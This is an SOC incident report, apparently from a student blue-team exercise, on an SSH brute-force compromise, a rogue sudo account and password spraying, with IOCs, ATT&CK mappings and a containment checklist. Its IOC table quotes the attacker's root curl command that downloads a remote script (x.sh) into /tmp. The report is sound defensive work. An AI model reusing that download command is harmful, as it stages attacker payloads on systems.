# SOC Incident Summary — GS-INC-20260915-805

| Field | Value |
|---|---|
| **Severity / Priority** | **CRITICAL / P1** |
| Risk score | 100 / 100 |
| Confidence | HIGH — multiple independent findings corroborate a single attack chain |
| Response SLA | 15 min |
| Notify | SOC Lead + IR Manager + system owner; page on-call |
| Activity window | 2026-09-14 00:05:01 → 2026-09-14 09:30:00 |
| Events analysed | 135 |
| Findings | CRITICAL: 2, HIGH: 5, MEDIUM: 3 |
| Analyst | Eswar Mahalingam (Blue Team, GS-STU-DSOU-2026-039A) |
| Generated | 2026-09-15 01:26:43 |
| Source | `data/findings.json` |

## 1. Executive summary

- 10 security findings were raised on the monitored host between 00:05 and 09:30 on 2026-09-14.
- Overall severity is CRITICAL (priority P1); risk score 100/100; confidence: HIGH.
- The highest-impact finding is: Successful login after failure burst (likely compromised credential) (203.0.113.45).

## 2. Attack narrative

1. Chain: credential guessing → successful root login → new account + sudo grant (persistence). This is a confirmed intrusion, not a scan.
2. From 203.0.113.45: the attacker at 203.0.113.45 — 00:05 — successful login after failure burst (likely compromised credential) (admin, root); then 00:05 — ssh brute force (many failures from one source) (admin, root); then 00:06 — privileged account login outside business hours (root).
3. From local: an actor already on the host — 00:08 — new local account created (svc_backup); then 00:09 — account added to privileged group (svc_backup); then 00:09 — privileged command fetched/staged a remote payload (root); then 09:00 — repeated failed sudo (local privilege-escalation probing) (arjun); then 09:30 — su to root attempted (arjun).
4. From 198.51.100.77: the attacker at 198.51.100.77 — 01:40 — password spraying (one source, many accounts) (alice, bob, carol); then 01:40 — username enumeration / invalid-user probing (alice, bob, carol).

## 3. Timeline

| Time | End | ID | Severity | Finding | Source | Accounts | Events |
|---|---|---|---|---|---|---|---|
| 00:05:01 | 00:06:42 | F03 | CRITICAL | Successful login after failure burst (likely compromised credential) | `203.0.113.45` | admin, root | 38 |
| 00:05:01 | 00:06:39 | F01 | HIGH | SSH brute force (many failures from one source) | `203.0.113.45` | admin, root | 37 |
| 00:06:42 | 00:06:42 | F04 | MEDIUM | Privileged account login outside business hours | `203.0.113.45` | root | 1 |
| 00:08:42 | 00:08:42 | F09 | HIGH | New local account created | `local` | svc_backup | 1 |
| 00:09:02 | 00:09:02 | F10 | CRITICAL | Account added to privileged group | `local` | svc_backup | 1 |
| 00:09:42 | 00:09:42 | F08 | HIGH | Privileged command fetched/staged a remote payload | `local` | root | 1 |
| 01:40:33 | 01:49:19 | F02 | HIGH | Password spraying (one source, many accounts) | `198.51.100.77` | alice, bob, carol… | 16 |
| 01:40:33 | 01:49:19 | F05 | MEDIUM | Username enumeration / invalid-user probing | `198.51.100.77` | alice, bob, carol… | 16 |
| 09:00:15 | 09:01:00 | F06 | HIGH | Repeated failed sudo (local privilege-escalation probing) | `local` | arjun | 4 |
| 09:30:00 | 09:30:00 | F07 | MEDIUM | su to root attempted | `local` | arjun | 1 |

## 4. Indicators of Compromise

| Type | Value | Seen in | Recommended action |
|---|---|---|---|
| IPv4 | `203.0.113.45` | Successful login after failure burst (likely compromised credential) | Block at perimeter; add to threat-intel watchlist; search other logs |
| Account | `admin` | Successful login after failure burst (likely compromised credential) | Disable + reset credential; review sessions |
| Account | `root` | Successful login after failure burst (likely compromised credential) | Disable + reset credential; review sessions |
| Account | `svc_backup` | Account added to privileged group | Disable + reset credential; review sessions |
| Command | `/usr/bin/curl -s http://203.0.113.45/x.sh -o /tmp/x.sh` | Privileged command fetched/staged a remote payload | Check for dropped files; hash and sandbox any payload |
| IPv4 | `198.51.100.77` | Password spraying (one source, many accounts) | Block at perimeter; add to threat-intel watchlist; search other logs |
| Account | `alice` | Password spraying (one source, many accounts) | Force password reset; monitor |
| Account | `bob` | Password spraying (one source, many accounts) | Force password reset; monitor |
| Account | `carol` | Password spraying (one source, many accounts) | Force password reset; monitor |
| Account | `dave` | Password spraying (one source, many accounts) | Force password reset; monitor |
| Account | `erin` | Password spraying (one source, many accounts) | Force password reset; monitor |
| Account | `frank` | Password spraying (one source, many accounts) | Force password reset; monitor |
| Account | `grace` | Password spraying (one source, many accounts) | Force password reset; monitor |
| Account | `heidi` | Password spraying (one source, many accounts) | Force password reset; monitor |
| Account | `ivan` | Password spraying (one source, many accounts) | Force password reset; monitor |
| Account | `judy` | Password spraying (one source, many accounts) | Force password reset; monitor |
| Account | `mallory` | Password spraying (one source, many accounts) | Force password reset; monitor |
| Account | `oscar` | Password spraying (one source, many accounts) | Force password reset; monitor |
| Account | `peggy` | Password spraying (one source, many accounts) | Force password reset; monitor |
| Account | `trent` | Password spraying (one source, many accounts) | Force password reset; monitor |
| Account | `victor` | Password spraying (one source, many accounts) | Force password reset; monitor |
| Account | `walter` | Password spraying (one source, many accounts) | Force password reset; monitor |
| Account | `arjun` | Repeated failed sudo (local privilege-escalation probing) | Force password reset; monitor |

## 5. MITRE ATT&CK

- T1078 Valid Accounts
- T1087 Account Discovery
- T1098 Account Manipulation
- T1105 Ingress Tool Transfer
- T1110.001 Password Guessing
- T1110.003 Password Spraying
- T1136.001 Create Account: Local
- T1548 Abuse Elevation Control Mechanism
- T1548.003 Sudo and Sudo Caching

## 6. Recommended actions per finding

| ID | Sev | Finding | Action |
|---|---|---|---|
| F03 | CRITICAL | Successful login after failure burst (likely compromised credential) | Isolate host from network; disable/reset the account; kill active sessions (`who`, `pkill -KILL -u <user>`); preserve /var/log and shell history; hunt for follow-on activity from the same source IP. |
| F10 | CRITICAL | Account added to privileged group | Remove the account from the group immediately (`gpasswd -d <user> sudo`); check /etc/sudoers.d for drop-ins; audit all commands run by the account. |
| F01 | HIGH | SSH brute force (many failures from one source) | Block source IP at perimeter firewall/fail2ban; enforce key-only SSH (`PasswordAuthentication no`); rate-limit port 22; check whether the IP appears in other logs. |
| F09 | HIGH | New local account created | Confirm against change management; if unapproved, lock (`usermod -L`) and expire the account; check for SSH keys planted in its home directory. |
| F08 | HIGH | Privileged command fetched/staged a remote payload | Hash and quarantine the dropped file (`sha256sum /tmp/x.sh`); check crontab/systemd for persistence; block the payload host; do NOT execute the file. |
| F02 | HIGH | Password spraying (one source, many accounts) | Block source IP; force password reset for any account that later succeeded; enable account lockout / MFA; review password policy for the sprayed user list. |
| F06 | HIGH | Repeated failed sudo (local privilege-escalation probing) | Interview the user's manager; check whether the account is shared; review sudoers grants for least privilege; enable sudo I/O logging. |
| F04 | MEDIUM | Privileged account login outside business hours | Confirm with the account owner; if unconfirmed, treat as part of the compromise chain; add a time-based alert rule for privileged logins. |
| F05 | MEDIUM | Username enumeration / invalid-user probing | Block source IP; ensure sshd returns identical responses for valid/invalid users (default in modern OpenSSH); add IP to watchlist. |
| F07 | MEDIUM | su to root attempted | Verify with the user; if unexplained, treat as credential misuse; restrict `su` to the wheel group in /etc/pam.d/su. |

## 7. Response checklist (NIST SP 800-61)

**Containment**
- [ ] Block attacker IPs at firewall
- [ ] Isolate affected host from production VLAN
- [ ] Disable compromised + rogue accounts
- [ ] Kill active attacker sessions

**Eradication**
- [ ] Remove rogue account and sudo grant
- [ ] Delete dropped files (/tmp/x.sh) after hashing
- [ ] Rotate root and all local passwords; enforce SSH keys
- [ ] Patch and re-baseline sshd/sudo configuration

**Recovery**
- [ ] Restore host from known-good image if root was compromised
- [ ] Re-enable monitoring; add detection rules for the observed pattern
- [ ] Monitor for 14 days for re-entry from the same IOCs

**Lessons learned**
- [ ] Why was password auth for root enabled?
- [ ] Why did 37 failures not trigger fail2ban?
- [ ] Add off-hours privileged-login alert

## 8. Escalation decision

Priority **P1** → notify **SOC Lead + IR Manager + system owner; page on-call** within **15 min**. Open a ticket, attach this summary and the raw log, and hand over with the checklist above.
